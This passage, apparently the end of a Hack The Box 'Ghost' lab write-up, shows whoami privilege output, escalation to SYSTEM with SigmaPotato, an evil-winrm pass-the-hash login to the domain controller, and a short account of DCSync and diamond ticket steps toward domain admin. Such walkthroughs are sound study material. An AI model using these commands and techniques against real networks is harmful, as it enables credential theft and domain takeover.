+NT SERVICE\ALL SERVICES                           Well-known group         S-1-5-80-0                                    Mandatory group, Enabled by default, Enabled group, 
+
+
+Privilege Name                Description                                       State                         
+============================= ================================================= ===========================
+SeAssignPrimaryTokenPrivilege Replace a process level token                     Disabled                      
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process                Disabled                      
+SeMachineAccountPrivilege     Add workstations to domain                        Disabled                      
+SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       
+SeImpersonatePrivilege        Impersonate a client after authentication         Enabled                       
+SeCreateGlobalPrivilege       Create global objects                             Enabled                       
+SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled
+[29/08 18:13:01] [+] BOF finished
+
++--- Task [25877138] closed ----------------------------------------------------------+</code></pre><p>Ill run the <code>whoami</code> BOF in adaptix and i see i have SeImpersonate</p><p>Ill use SigmaPotato to abuse the privilege</p><p><a href="https://github.com/tylerdotrar/SigmaPotato" target="_blank" rel="noreferrer">https://github.com/tylerdotrar/SigmaPotato</a></p><p>Ill get a shell as SYSTEM thanks to SigmaPotato</p><h2>Domain Admin</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i dc01.ghost.htb -u Administrator -H &#39;1cdb17d5c14ff69e7067cffcc9e470bd&#39;
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; whoami
+ghost\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; </code></pre><p>Then performing a diamond ticket attack using my beacon and the built in BOFs to get domain admin</p><p>This was first accomplished by doing a DCSync attack on the <code>PRIMARY</code> server since i was SYSTEM and getting the aes256 key of the krbtgt user account of the <code>corp.ghost.htb</code> domain</p><p>Then using it to perform a diamond ticket to get Domain admin!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-darkcorp/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">DarkCorp</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-fireflow/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Fireflow</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
